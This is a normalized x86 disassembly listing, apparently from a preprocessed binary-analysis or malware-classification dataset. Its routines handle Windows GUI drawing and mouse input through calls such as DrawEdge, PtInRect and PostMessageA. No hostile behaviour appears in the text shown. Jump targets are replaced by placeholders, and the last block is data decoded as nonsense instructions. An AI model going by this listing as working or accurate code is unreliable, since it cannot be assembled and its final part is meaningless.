call sub_4138b8
jmp r-xdata
mov eax [ ebp + 0x24 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
or ebx 0xffffffff
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_4139c8
mov ebx eax
xor edx edx
mov eax [ ebp + 0x20 ]
call sub_4138b8
jmp r-xdata
mov eax [ ebp + 0x20 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov eax [ ebp - 0x10 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
mov [ ebp + 0x10 ] eax
mov esi rw-data
lea edi [ ebp - 0x39 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
test ebx ebx
jge r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x40 ] 0x80000001
mov [ ebp - 0x44 ] 0x80000001
push esi
lea edi [ ebp - 0x21 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov al 0x1
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
add ebx [ ebp - 0x15 ]
sub ebx [ ebp - 0x1d ]
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov ebx [ ebp - 0x35 ]
add ebx [ ebp - 0x2d ]
push ebp
call sub_42ae48
pop ecx
inc eax
mov [ ebp - 0x54 ] eax
xor esi esi
xor eax eax
jmp r-xdata
mov [ ebp + 0xc ] 0x1
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
mov [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] 0x0
jne r-xdata
cmp eax [ ebp - 0x44 ]
jle r-xdata
mov [ ebp - 0x40 ] edx
mov [ ebp - 0x29 ] al
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
shr eax 0x1
add eax [ ebp - 0x1d ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x5 ] 0x0
mov [ ebp - 0x11 ] 0x0
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x10 ]
mov al [ eax + 0x234 ]
and al [ ebp + 0x8 ]
je r-xdata
mov [ ebp + 0xc ] 0x1
cmp [ ebp + 0x8 ] 0x0
je r-xdata
inc [ ebp + 0xc ]
mov eax [ ebp - 0x21 ]
cmp eax [ ebp - 0x64 ]
jle r-xdata
mov [ ebp - 0x44 ] eax
mov eax [ ebp - 0x21 ]
add eax [ ebp + 0x10 ]
mov [ ebp - 0x19 ] eax
lea edx [ ebp - 0x39 ]
lea eax [ ebp - 0x21 ]
call sub_429b40
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
lea eax [ ebp + 0x10 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea ecx [ ebp - 0x39 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x10 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp esi eax
je r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jle r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
imul [ ebp + 0xc ]
add eax [ ebp - 0x1d ]
mov [ ebp - 0x15 ] eax
mov eax [ ebp - 0x10 ]
push [ eax + 0x230 ]
mov eax ebx
pop edx
mov ecx edx
cdq
idiv ecx
inc eax
mov [ ebp + 0xc ] eax
inc [ ebp + 0xc ]
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x44 ]
jge r-xdata
lea eax [ esi + 0x1 ]
cmp eax [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0x5 ] 0x0
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x64 ]
cmp eax [ ebp - 0x21 ]
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
call sub_4139c8
cmp [ eax + 0x15 ] 0x0
je r-xdata
cmp [ ebp - 0x4d ] 0x0
jne r-xdata
mov al 0x1
cmp [ ebx + 0x34 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x48 ]
cmp eax [ ebp - 0x60 ]
jl r-xdata
inc esi
dec [ ebp - 0x54 ]
jne r-xdata
xor eax eax
mov [ ebp - 0x40 ] eax
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x230 ]
mov [ ebp - 0x40 ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov [ ebp - 0x11 ] al
push ebp
call sub_42ae48
pop ecx
jmp r-xdata
mov al 0x1
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x228 ]
mov edx esi
call sub_4139c8
mov ebx eax
mov eax [ ebx + 0x1a ]
add eax [ ebx + 0x24 ]
push eax
lea eax [ ebp - 0x64 ]
push eax
mov edi [ ebx + 0x16 ]
mov ecx edi
add ecx [ ebx + 0x20 ]
mov edx [ ebx + 0x1a ]
mov eax edi
call sub_412594
mov eax [ ebp - 0x58 ]
mov edx eax
sub edx [ ebp - 0x60 ]
cmp edx [ ebp - 0x40 ]
jle r-xdata
mov [ ebp - 0x5 ] al
lea eax [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x24
sub_42b2e4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov ebx eax
mov eax [ esp ]
mov [ ebx + 0x214 ] eax
mov eax [ ebx + 0x228 ]
mov ebp [ eax + 0x8 ]
dec ebp
test ebp ebp
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
xor edi edi
inc edi
dec ebp
jne r-xdata
cmp [ esi + 0x15 ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x228 ]
call sub_4139c8
mov esi eax
mov eax [ esi ]
cmp eax [ esp ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0x228 ]
call sub_429b18
jmp r-xdata
mov eax [ ebx + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
cmp edi eax
jge r-xdata
lea edx [ edi + 0x1 ]
mov eax [ ebx + 0x228 ]
call sub_4139c8
mov [ eax + 0x15 ] 0x1
sub_42b360
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + 0x242 ] 0x0
je r-xdata
mov [ esi ] 0x1
pop esi
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x244 ]
call [ ebx + 0x240 ]
sub_42b39c
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffec
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_41cb80
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
add edx 0x2
mov eax [ esi ]
call sub_41d2dc
mov ecx [ ebx + 0x4 ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_41d27c
mov ecx [ ebx + 0xc ]
inc ecx
mov edx [ ebx ]
mov eax [ esi ]
call sub_41d27c
mov eax [ esi ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_41cb80
mov ecx [ ebx + 0x4 ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_41d2dc
mov ecx [ ebx + 0xc ]
mov edx [ ebx + 0x8 ]
mov eax [ esi ]
call sub_41d27c
mov ecx [ ebx + 0xc ]
mov edx [ ebx ]
mov eax [ esi ]
call sub_41d27c
pop esi
pop ebx
pop ebp
retn
sub_42b420
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi [ ebp + 0x8 ]
mov dl [ r-xdata ]
mov [ ebp - 0x15 ] dl
push esi
lea edx [ ebp - 0x15 ]
push edx
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov ebx [ eax ]
call [ ebx + 0xd0 ]
test [ ebp - 0x15 ] 0x2
je r-xdata
test [ ebp - 0x15 ] 0x1
je r-xdata
push 0xf
push 0x4
push esi
mov eax [ ebp - 0x4 ]
call sub_41d628
push eax
call DrawEdge
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov eax [ esi + 0xc ]
sub eax 0x3
push eax
lea eax [ ebp - 0x14 ]
push eax
mov ebx [ esi ]
add ebx 0x3
mov ecx ebx
add ecx 0x2
mov edx [ esi + 0x4 ]
add edx 0x2
mov eax ebx
call sub_412594
push ebp
call sub_42b39c
pop ecx
sub_42b49d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
add esp 0xffffffe8
mov esi eax
cmp [ esi + 0x25a ] 0x0
je r-xdata
mov eax [ esi + 0x228 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
mov edx esi
mov eax [ esi + 0x25c ]
call [ esi + 0x258 ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
inc eax
mov [ esp + 0x4 ] eax
mov [ esp ] 0x0
inc [ esp ]
dec [ esp + 0x4 ]
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov edx [ esp ]
mov eax [ esi + 0x228 ]
call sub_4139c8
mov ebx eax
mov edi [ ebx ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x8 ]
mov eax edi
call sub_43d864
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x8 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0xc ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x10 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x14 ] eax
lea eax [ esp + 0x8 ]
push eax
mov ecx edi
mov edx [ esi + 0x208 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xdc ]
cmp [ edi + 0x57 ] 0x0
je r-xdata
sub_42b560
push ebx
push esi
push edi
add esp 0xffffffd8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
mov eax [ esi + 0x228 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
xor eax eax
mov [ esp + 0x8 ] eax
inc edi
mov [ esp + 0xc ] 0x0
inc [ esp + 0xc ]
dec edi
jne r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
mov eax [ esi + 0x228 ]
mov edx [ esp + 0xc ]
call sub_4139c8
mov [ esp + 0x8 ] eax
mov ebx [ esp + 0x8 ]
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
lea edx [ esp + 0x10 ]
mov eax [ ebx ]
call sub_43d864
lea eax [ ebx + 0x4 ]
mov edx [ eax ]
sub [ esp + 0x10 ] edx
mov edx [ eax + 0x4 ]
sub [ esp + 0x14 ] edx
mov edx [ eax + 0x8 ]
add [ esp + 0x18 ] edx
mov eax [ eax + 0xc ]
add [ esp + 0x1c ] eax
lea ecx [ esp + 0x20 ]
mov edx [ esp + 0x4 ]
mov eax [ esp ]
call sub_41256c
push [ esp + 0x24 ]
push [ esp + 0x24 ]
lea eax [ esp + 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x57 ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_42b620
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_4449fc
test al al
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_440f90
xor eax eax
push ebp
push sub_42b69f
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x90 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov dx [ r-xdata ]
not edx
and dx [ eax + 0x54 ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x54 ] dx
mov eax [ ebp - 0x4 ]
call sub_440f98
retn
sub_42b6ae
add [ eax ] al
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443ed0
cmp [ esi + 0x4 ] 0x11
jne r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
cmp [ ebx + 0x211 ] 0x0
je r-xdata
cmp [ ebx + 0x218 ] 0x0
je r-xdata
mov edx [ ebx + 0x218 ]
mov eax ebx
call sub_42b9f0
test eax eax
je r-xdata
cmp [ eax ] 0x0
je r-xdata
mov esi eax
push esp
call GetCursorPos
push 0x1
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_4446f8
push eax
push 0x0
call MapWindowPoints
mov eax [ esp + 0x4 ]
push eax
push 0x1
mov edx [ esi ]
mov ecx [ esp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0xd4 ]
sub_42b734
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
add esi 0xfffffffc
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ esi ]
xor edx edx
mov [ eax + 0x218 ] edx
mov eax [ esi ]
xor edx edx
mov [ eax + 0x214 ] edx
mov eax [ esi ]
xor edx edx
call sub_42b620
pop esi
pop ebx
pop ebp
retn
mov eax [ esi ]
mov eax [ eax + 0x228 ]
mov edx ebx
call sub_4139c8
call sub_4026dc
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_42b798
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x6 ] cl
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0xc ]
push esi
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x6 ]
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
call sub_43f4d8
mov eax [ ebp - 0x4 ]
call sub_43e0ec
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
push ebp
call sub_42b734
pop ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_42b560
mov ebx eax
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_42b9f0
mov ebx eax
jmp r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
test ebx ebx
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx ]
mov [ edx + 0x218 ] eax
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x214 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x211 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x214 ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
test [ ebp - 0x6 ] 0x40
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx [ ebx + 0x3d ]
sub edx [ ebp + 0x8 ]
mov eax [ ebx + 0x39 ]
sub eax esi
call sub_41256c
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x21c ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x220 ] edx
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov ecx esi
mov edx [ ebx ]
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
sub_42b8a4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
call sub_43f790
mov eax ebx
call sub_43e0ec
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
mov eax [ ebx + 0x218 ]
test eax eax
je r-xdata
mov edx eax
mov eax ebx
call sub_42b9f0
test eax eax
je r-xdata
mov esi eax
mov eax [ ebp - 0x8 ]
add eax [ ebx + 0x21c ]
mov [ esi + 0x16 ] eax
mov eax [ ebp + 0x8 ]
add eax [ ebx + 0x220 ]
mov [ esi + 0x1a ] eax
mov eax [ esi + 0x16 ]
mov [ esi + 0x39 ] eax
mov eax [ esi + 0x1a ]
mov [ esi + 0x3d ] eax
mov eax [ esi ]
mov eax [ eax + 0x48 ]
add eax [ esi + 0x4 ]
add eax [ esi + 0xc ]
mov [ esi + 0x44 ] eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov edx [ esi ]
mov eax ebx
call sub_42b620
cmp [ ebx + 0x211 ] 0x0
je r-xdata
mov eax [ esi ]
mov edi [ eax + 0x4c ]
mov eax edi
neg eax
cmp eax [ esi + 0x16 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0x1
mov ecx [ ebp - 0x8 ]
mov edx [ esi ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xd4 ]
test al al
jne r-xdata
mov eax edi
neg eax
cmp eax [ esi + 0x1a ]
jg r-xdata
mov eax ebx
call sub_43d8c8
add eax edi
cmp eax [ esi + 0x16 ]
jl r-xdata
mov eax ebx
call sub_43d90c
add edi eax
cmp edi [ esi + 0x1a ]
jge r-xdata
sub_42b998
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx edx
mov esi eax
mov eax [ esi + 0x218 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax esi
call sub_43f838
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
xor edx edx
mov [ esi + 0x218 ] edx
cmp eax [ esi + 0x214 ]
jne r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0xe0 ]
xor eax eax
mov [ esi + 0x214 ] eax
jmp r-xdata
sub_42b9f0
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x228 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
cmp ebp [ eax ]
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_4139c8
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov eax [ edi + 0x228 ]
mov edx ebx
call sub_4139c8
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_42ba3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x1 ] 0x1
test ebx ebx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp [ eax + 0x23a ] 0x0
je r-xdata
mov al [ ebp - 0x1 ]
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
or ecx 0xffffffff
mov dl 0x1
mov eax ebx
call sub_43e584
lea edx [ ebp - 0x1 ]
push edx
mov esi eax
mov ecx ebx
mov edx eax
mov eax [ esi + 0x23c ]
call [ esi + 0x238 ]
sub_42ba88
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
push eax
push ebx
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax edi
call sub_4430d8
cmp [ edi + 0x211 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0x0
je r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x212 ] 0x0
je r-xdata
mov eax [ esi + 0x38 ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
mov eax [ esi + 0x38 ]
mov [ edi + 0x218 ] eax
mov dl 0x1
call sub_43e648
mov ebx [ edi + 0x218 ]
mov dx [ ebx + 0x44 ]
mov ax [ ebx + 0x40 ]
call sub_40691c
push eax
push 0x1
push 0x201
mov eax edi
call sub_4446f8
push eax
call PostMessageA
sub_42bb18
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] ecx
mov esi eax
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push ebx
mov ecx [ ebp - 0x4 ]
mov eax esi
call sub_4431cc
cmp [ ebx ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp [ esi + 0x225 ] 0x0
je r-xdata
mov [ ebx ] al
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al 0x1
sub_42bb80
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x252 ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x254 ]
call [ ebx + 0x250 ]
sub_42bbdc
push ebx
push esi
push edi
push ebp
mov ebp eax
xor ebx ebx
mov eax [ ebp + 0x22c ]
mov esi [ eax + 0xc ]
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebp + 0x1c ] 0x1
jne r-xdata
test esi esi
je r-xdata
cmp [ esi + 0x22 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jne r-xdata
mov eax ebp
call sub_455b0c
mov edi eax
test edi edi
je r-xdata
mov [ esi + 0x22 ] 0x0
jmp r-xdata
cmp [ edi + 0x22e ] 0x0
je r-xdata
mov eax edi
call sub_4449fc
test al al
je r-xdata
cmp [ ebp + 0x224 ] 0x0
je r-xdata
push 0x0
push 0x0
push 0x30f
mov eax edi
call sub_4446f8
push eax
call PostMessageA
push 0x0
xor ecx ecx
mov edx 0x30f
mov eax edi
call sub_43f0c4
jmp r-xdata
mov bl 0x1
mov [ esi + 0x22 ] 0x0
sub_42bc74
push ebx
mov ebx eax
mov eax [ ebx + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
cmp [ ebx + 0x224 ] 0x0
jne r-xdata
mov eax ebx
call sub_42bbdc
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x224 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
sub_42bcb4
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443e0c
cmp [ esi + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x218 ]
jne r-xdata
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_42b2e4
cmp [ ebx + 0x5c ] 0x0
je r-xdata
xor eax eax
mov [ ebx + 0x218 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffee
call sub_403468
sub_42bd04
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x218 ] 0x0
jne r-xdata
mov al 0x1
movsx ecx [ esi + 0xa ]
movsx edx [ esi + 0x8 ]
mov eax ebx
call sub_42b550
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
and eax 0x7f
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
sub_42bd38
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov edx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d6a8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x70 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41ce60
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
xor edx edx
call sub_41cf7c
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_41d204
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_442b4c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
push ebp
push sub_42be99
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x20 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x224 ]
mov [ ebp - 0x9 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x224 ] 0x1
xor eax eax
push ebp
push sub_42be61
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fa00
push eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
pop edx
mov ecx edx
cdq
idiv ecx
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42be68
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x9 ]
mov [ eax + 0x224 ] dl
retn
inc eax
mov [ ebp - 0x10 ] eax
xor edi edi
inc edi
dec [ ebp - 0x10 ]
jne r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fa18
push eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
pop edx
mov ecx edx
cdq
idiv ecx
mov ebx eax
test ebx ebx
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fa18
imul esi
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x22c ]
call sub_41fa00
mov edx eax
imul edx edi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
pop ecx
call sub_41d158
inc esi
dec ebx
jne r-xdata
sub_42be68
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0xc ] 0x1
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor edx edx
call sub_41d6a8
sub_42bef8
test [ fs : esi ] 0x27
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edx ] ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ebx ] ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi + edi * 8 ] ch
add [ eax ] al
test [ fs : esi ] 0x2d
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ esi ] ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ edi ] ch
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ eax ] dl
inc [ eax ]
add [ esi + esi * 8 + 0x46 ] ah
add [ ecx ] dl
inc [ eax ]
